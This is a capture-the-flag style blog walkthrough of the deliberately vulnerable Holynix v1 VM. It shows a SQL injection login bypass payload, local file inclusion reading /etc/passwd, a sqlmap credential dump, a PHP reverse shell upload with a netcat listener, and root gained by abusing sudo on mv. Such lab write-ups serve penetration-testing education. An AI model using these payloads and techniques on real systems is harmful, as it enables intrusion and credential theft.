---
layout: post
title:  "Holynix: v1"
date:   2021-1-3  +0400
categories: vulnhub holynix
description: "Holynix is a Linux distribution that was deliberately built to have security holes for the purposes of penetration testing. Similar to the de-ice and pWnOS pentest cds, Holynix is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information."
---

<span style="text-decoration: underline">Box Stats:</span>

| Name: | Holynix: v1 |
|-------|--------|
| Series: | [Holynix](https://www.vulnhub.com/series/holynix,6/) |
| Link: | [Holynix: v1](https://www.vulnhub.com/entry/holynix-v1,20/) |
| OS: | Linux - Ubuntu 8.04.4 LTS |
| Creator: | [holynix](https://www.vulnhub.com/author/holynix,4/) |

## Topics: ##
- SQL Injection
- Enumeration
- Web App
- Privilige Escalation

## Recon #
Like always, start scanning the machine as you wish, I either use my own automated tool or just the commands that I am familiar with. Either way, we should end up with the same results:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 11:26 UTC
Nmap scan report for $IP.
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
```

## Enumeration ##
```
80 - HTTP - Apache 2.2.8
```
When I first saw this I was surprised, but it was listed as `easy/beginner` so I guess having one port open, especially a webserver suggests that we will be able to upload a shell and establish a connection with the target. I'm predicting this will be a php reverse shell.

# Port 80 - HTTP #
We can start by `directory bruteforcing` and enumerating the website using tools such as `nikto, burpsuite, etc`. This challenge is very web-based, so we have to pay attention when performing these scans.

I like to use `Dirsearch` for directory bruteforcing, as it is quick and clean:
```
[11:33:57] Starting: 
[11:33:59] 403 -  334B  - /.ht_wsr.txt
[11:33:59] 403 -  337B  - /.htaccess.save
[11:33:59] 403 -  337B  - /.htaccess.orig
[11:33:59] 403 -  339B  - /.htaccess.sample
[11:33:59] 403 -  337B  - /.htaccess.bak1
[11:33:59] 403 -  335B  - /.htaccessOLD
[11:33:59] 403 -  335B  - /.htaccessBAK
[11:33:59] 403 -  336B  - /.htaccessOLD2
[11:33:59] 403 -  335B  - /.htaccess_sc
[11:33:59] 403 -  338B  - /.htaccess_extra
[11:33:59] 403 -  337B  - /.htaccess_orig
[11:33:59] 403 -  328B  - /.html
[11:33:59] 403 -  327B  - /.htm
[11:33:59] 403 -  337B  - /.htpasswd_test
[11:33:59] 403 -  333B  - /.htpasswds
[11:33:59] 403 -  334B  - /.httr-oauth
[11:34:16] 403 -  331B  - /cgi-bin/
[11:34:19] 403 -  331B  - /doc/api/
[11:34:19] 403 -  342B  - /doc/en/changes.html
[11:34:19] 403 -  327B  - /doc/
[11:34:19] 403 -  341B  - /doc/stable.version
[11:34:21] 200 -   63B  - /footer
[11:34:22] 200 -  604B  - /header
[11:34:22] 200 -  604B  - /header.php
[11:34:22] 200 -  109B  - /home.php
[11:34:22] 200 -  109B  - /home
[11:34:22] 301 -  356B  - /img  ->  http://192.168.234.212/img/
[11:34:22] 200 -  776B  - /index
[11:34:22] 200 -  776B  - /index.php
[11:34:23] 200 -  776B  - /index.php/login/
[11:34:24] 200 -  342B  - /login
[11:34:24] 200 -  342B  - /login.php
[11:34:24] 200 -  342B  - /login/
[11:34:24] 200 -  342B  - /login/admin/admin.asp
[11:34:24] 200 -  342B  - /login/admin/
[11:34:24] 200 -  342B  - /login/administrator/
[11:34:24] 200 -  342B  - /login/cpanel.php
[11:34:24] 200 -  342B  - /login/cpanel.asp
[11:34:24] 200 -  342B  - /login/cpanel.jsp
[11:34:24] 200 -  342B  - /login/cpanel.html
[11:34:24] 200 -  342B  - /login/cpanel.htm
[11:34:24] 200 -  342B  - /login/cpanel.aspx
[11:34:24] 200 -  342B  - /login/cpanel.js
[11:34:24] 200 -  342B  - /login/cpanel/
[11:34:24] 200 -  342B  - /login/index
[11:34:24] 200 -  342B  - /login/login
[11:34:24] 200 -  342B  - /login/super
[11:34:24] 200 -  342B  - /login/oauth/
[11:34:25] 301 -  357B  - /misc  ->  http://192.168.234.212/misc/
[11:34:31] 403 -  336B  - /server-status
[11:34:31] 403 -  337B  - /server-status/
[11:34:34] 200 -   44B  - /transfer
[11:34:34] 301 -  359B  - /upload  ->  http://192.168.234.212/upload/
[11:34:34] 200 -   44B  - /upload.php
[11:34:34] 200 -   26B  - /upload/
[11:34:37] 301 -  360B  - /~backup  ->  http://192.168.234.212/~backup/
[11:34:37] 301 -  357B  - /~bin  ->  http://192.168.234.212/~bin/
[11:34:37] 301 -  360B  - /~daemon  ->  http://192.168.234.212/~daemon/
[11:34:37] 301 -  359B  - /~games  ->  http://192.168.234.212/~games/
[11:34:37] 301 -  358B  - /~mail  ->  http://192.168.234.212/~mail/
[11:34:37] 301 -  358B  - /~sync  ->  http://192.168.234.212/~sync/
```

We can navigate to the website by entering the IP address into the searchbar. We are greeted with an 'ugly' and probably unsanitized functions that can allow us to exploit this machine. 

![Links](https://raw.githubusercontent.com/ctrllevi/ctrllevi.github.io/main/_posts/images/holynix/links.png)

I always like to test for SQL vulnerabilities, simply by entering `'` into the input fields. If there is a backend database that uses SQL, then it will throw an error that shows us how the server queries inputs. This is very useful as we can craft our on injections that allow us to bypass logins. Here is the error I got:
```
SQL Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

SQL Statement:SELECT * FROM accounts WHERE username='\'' AND password='''
```

## Exploitation ##


# Unsuccessful RCE #
After analysing this, we can come to the conclusion that bypassing the login page is quite simple. What the interesting thing is, that we can enter anything in to the `username` field, if the password field is `' or 1=1 -- .`. For a proof of concept, try entering `admin` as the username, and `' or 1=1 -- .` as the password. This will allow us to login with a user called `alamo`.

We can then head to the uploads section, which allows us to upload files from our computer. Here is where the php reverse shell comes in. We have it located at `/usr/share/webshells/php/php-reverse-shell.php` in our kali machine. We can try to upload this, but however to our surprise, the user `alamo` doesn't have priviliges to upload files to the directory.

# LFI using BurpSuite #
If we browse to the security page, we can see that we can choose files that we want to list. These are all security practices for the company. We can analyse the requests we send by using burpsuite. When we click the `Display File` button on the website, it pulls a file from the target's computer:

![Using Burpsuite for LFI](https://raw.githubusercontent.com/ctrllevi/ctrllevi.github.io/main/_posts/images/holynix/burp.png)

We can change the `text_file_name` paramater to file that we want to display. To prove this is an LFI, I entered `/etc/passwd` which listed all the users on the machine:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
alamo:x:1000:115::/home/alamo:/bin/bash
etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
hreiser:x:1003:50::/home/hreiser:/bin/bash
jdraper:x:1004:100::/home/jdraper:/bin/bash
jjames:x:1005:50::/home/jjames:/bin/bash
jljohansen:x:1006:115::/home/jljohansen:/bin/bash
ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
mrbutler:x:1009:50::/home/mrbutler:/bin/bash
rtmorris:x:1010:100::/home/rtmorris:/bin/bash
```
Using this information, we can use `SQLmap` to find vulnerabilites and/or gain access to credentials in the SQL database. We can use the command `sqlmap -u "http://___.___._.___/index.php?page=login.php" --data="username-etenenbaum" --dbs --forms --batch --dump` which will give us the output of:

```
+-----+--------+------------+--------------------+
| cid | upload | username   | password           |
+-----+--------+------------+--------------------+
| 1   | 0      | alamo      | Ih@cK3dM1cR05oF7   |
| 2   | 1      | etenenbaum | P3n7@g0n0wN3d      |
| 3   | 1      | gmckinnon  | d15cL0suR3Pr0J3c7  |
| 4   | 1      | hreiser    | Ik1Ll3dNiN@r315er  |
| 5   | 1      | jdraper    | p1@yIngW17hPh0n35  |
| 6   | 1      | jjames     | @rR35t3D@716       |
| 7   | 1      | jljohansen | m@k1nGb0o7L3g5     |
| 8   | 1      | kpoulsen   | wH@7ar37H3Fed5D01n |
| 9   | 0      | ltorvalds  | f@7H3r0FL1nUX      |
| 10  | 1      | mrbutler   | n@5aHaSw0rM5       |
| 11  | 1      | rtmorris   | Myd@d51N7h3NSA     |
+-----+--------+------------+--------------------+
```
We can head back to the website, and login with a user that has the priviliges to upload files. These are the followwing users: `etenenbaum, gmckinnon, hreiser, jdraper, jjames, jljohansen, kpoulsen, mrbutler, rtmorris`. I will user `etenenbaum`. After logging in, we can upload our shell. To execute the php shell on the server, head to `http://___.___._.___/~_____/` and try clicking on your uploaded shell. It gives a `Forbidden` error. To bypass this, compress your shell and use the `autoextract` feature on the website. We have to use `tar` to compress because if we look at the source code, it uses `tar` to extract it. We use the command `tar czf _____.tar.gz _____.php`. We can then setup our listener, and execute the php shell.

```
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.218.42] from (UNKNOWN) [192.168.218.212] 53284
Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
 10:07:00 up 16 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami; id   
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```

## Privilige Escalation ##
We can see we have sudo permissions to run `mv` without a password! We can use this to do our privilige escalation! We can move `/bin/bash` as `/bin/mv` and we can interact with bash under the name of `/bin/mv`. We can use the `-p` flag to get a root shell!
```
$ sudo mv /bin/bash /bin/mv
$ sudo /bin/mv -p
whoami
root
```
You can refer to the GTFOBins at `https://gtfobins.github.io/gtfobins/mv/#suid` which also shows a method to get root access to the machine. Here is the code that it suggests which basically does the same thing that we did above. It writes data to a file, which gets executed with root priviliges:
```

    LFILE=file_to_write
    TF=$(mktemp)
    echo "DATA" > $TF
    sudo mv $TF $LFILE

```

Thank you for reading this writeup! I hope you enjoyed, and see you later. If you have any questions you can contact me on twitter or github. Thanks again for sticking around, have fun!
